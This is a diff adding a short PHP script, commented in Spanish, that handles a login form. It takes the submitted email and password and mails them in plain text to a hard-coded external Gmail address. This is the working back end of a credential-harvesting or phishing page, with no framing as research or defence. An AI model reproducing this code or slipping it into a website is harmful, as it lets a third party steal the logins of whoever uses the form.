@@ -1,0 +1,32 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Recogemos los datos del formulario
+    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
+    $password = htmlspecialchars($_POST['password']);
+    
+    // Dirección de destino del correo
+    $to = "rimasmusicny@gmail.com";
+    
+    // Asunto del correo
+    $subject = "Inicio de sesión - Datos de usuario";
+
+    // Mensaje del correo
+    $message = "Se ha intentado iniciar sesión con los siguientes datos:\n\n";
+    $message .= "Correo electrónico: " . $email . "\n";
+    $message .= "Contraseña: " . $password . "\n";
+
+    // Encabezados del correo
+    $headers = "From: no-reply@tu-dominio.com\r\n";
+    $headers .= "Reply-To: no-reply@tu-dominio.com\r\n";
+    $headers .= "X-Mailer: PHP/" . phpversion();
+
+    // Envío del correo
+    if (mail($to, $subject, $message, $headers)) {
+        echo "El correo ha sido enviado correctamente.";
+    } else {
+        echo "Error al enviar el correo.";
+    }
+} else {
+    echo "Método de envío no permitido.";
+}
+?>
